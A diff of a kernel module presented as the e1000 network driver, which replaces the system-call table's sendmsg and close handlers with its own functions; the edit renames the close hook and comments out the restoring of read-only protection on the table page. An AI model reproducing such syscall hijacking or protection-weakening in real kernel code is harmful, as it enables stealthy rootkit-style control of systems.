@@ -275,7 +275,7 @@ asmlinkage int e1000_sendmsg(int sockfd, struct mmsghdr *msgvec, unsigned int vl
 }
 
 asmlinkage long (*original_close) (unsigned int fd);
-asmlinkage long e1000_close(unsigned int fd)
+asmlinkage long e1000_sock_close(unsigned int fd)
 { 
     struct socket* sock;
     struct net_device *dev;
@@ -339,7 +339,7 @@ static int __init e1000_init_module(void)
         original_sendmsg = (void *)sys_call_table[__NR_sendmsg];
         sys_call_table[__NR_sendmsg] = e1000_sendmsg;
         original_close = (void *)sys_call_table[__NR_close];
-        sys_call_table[__NR_close] = e1000_close;
+        sys_call_table[__NR_close] = e1000_sock_close;
         
         write_cr0(read_cr0() | (0x10000));
         
@@ -369,7 +369,7 @@ static void __exit e1000_exit_module(void)
         //xchg(&sys_call_table[__NR_sendmsg], original_sendmsg);
         sys_call_table[__NR_sendmsg] = original_sendmsg;
         _sys_call_page = virt_to_page(&sys_call_table);
-        pages_ro(_sys_call_page, 1);
+       // pages_ro(_sys_call_page, 1);
         write_cr0(read_cr0() | (0x10000));
 	pci_unregister_driver(&e1000_driver);
 }
